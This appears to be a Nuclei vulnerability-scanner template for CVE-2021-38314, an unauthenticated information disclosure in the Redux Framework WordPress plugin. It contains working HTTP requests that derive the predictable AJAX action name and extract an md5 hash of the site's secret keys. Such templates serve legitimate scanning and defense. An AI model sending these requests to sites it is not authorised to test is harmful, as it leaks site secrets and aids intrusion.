id: CVE-2021-38314

info:
  name: Redux Framework - Unauthenticated Sensitive Information Disclosure
  author: meme-lord
  severity: medium
  description: The Gutenberg Template Library & Redux Framework plugin <= 4.2.11 for WordPress registered several AJAX actions available to unauthenticated users in the `includes` function in `redux-core/class-redux-core.php`
    that were unique to a given site but deterministic and predictable given that they were based on an md5 hash of the site URL with a known salt value of '-redux' and an md5 hash of the previous hash with a known
    salt value of '-support'. These AJAX actions could be used to retrieve a list of active plugins and their versions, the site's PHP version, and an unsalted md5 hash of site's `AUTH_KEY` concatenated with the
    `SECURE_AUTH_KEY`.
  reference:
    - https://www.wordfence.com/blog/2021/09/over-1-million-sites-affected-by-redux-framework-vulnerabilities/
    - https://wahaz.medium.com/unauthenticated-sensitive-information-disclosure-at-redacted-2702224098c
    - https://blog.sorcery.ie/posts/redux_wordpress/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2021-38314
  tags: cve,cve2021,wordpress,wp-plugin

requests:
  - raw:
      - |
        GET /wp-admin/admin-ajax.php?action={{md5(replace('http://HOST/-redux','HOST',Hostname))}} HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

      - |
        GET /wp-admin/admin-ajax.php?action={{md5(replace('https://HOST/-redux','HOST',Hostname))}} HTTP/1.1
        Host: {{Hostname}}
        Accept: */*

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "len(body)<50"

      - type: regex
        name: meme
        regex:
          - '[a-f0-9]{32}'
        part: body

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        regex:
          - "[a-f0-9]{32}"
